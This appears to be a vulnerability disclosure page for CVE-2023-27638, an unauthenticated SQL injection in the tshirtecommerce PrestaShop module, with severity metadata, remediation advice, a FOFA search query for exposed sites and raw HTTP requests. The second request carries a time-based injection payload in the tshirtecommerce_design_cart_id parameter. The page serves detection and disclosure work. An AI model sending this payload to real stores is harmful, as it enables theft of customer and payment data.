---
layout: post
cve_id: CVE-2023-27638
title: tshirtecommerce PrestaShop Module - SQL Injection
pcap: true
pcap_path: /pcaps/2023/CVE-2023-27638.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-27638.yaml
snort2_rule: N/A
snort3_rule: N/A
author: ritikchaddha
severity: high
impact: 'Unauthenticated attackers can execute SQL injection through the tshirtecommerce_design_cart_id
  parameter to extract the complete PrestaShop database including customer data and
  payment information.

  '
remediation: 'Update the tshirtecommerce module to the latest version and apply all
  security patches.

  '
reference:
- https://security.friendsofpresta.org/module/2023/03/21/tshirtecommerce_cwe-89.html
- https://nvd.nist.gov/vuln/detail/CVE-2023-27638
classification:
  cve-id: CVE-2023-27638
  cwe-id: CWE-89
  epss-score: 0.58686
  epss-percentile: 0.98133
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
metadata:
  max-request: 1
  vendor: tshirtecommerce
  product: prestashop
  fofa-query: body="Prestashop" && body="tshirtecommerce"
tags:
- cve
- cve2023
- prestashop
- tshirtecommerce
- sqli
- vkev
- vuln
---

## üîç Vulnerability Description
The tshirtecommerce module for PrestaShop is vulnerable to unauthenticated SQL injection via the tshirtecommerce_design_cart_id parameter, allowing attackers to execute arbitrary SQL queries and extract sensitive information from the database. This is due to lack of input sanitization, as shown in the patch where pSQL() is now used.


## üåê HTTP Request
```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.5.20) Gecko/ Firefox/3.6.15
Connection: close
Accept-Encoding: gzip
```

```nohighlight
GET /module/tshirtecommerce/designer?tshirtecommerce_design_cart_id=1%20OR%20SLEEP(8) HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

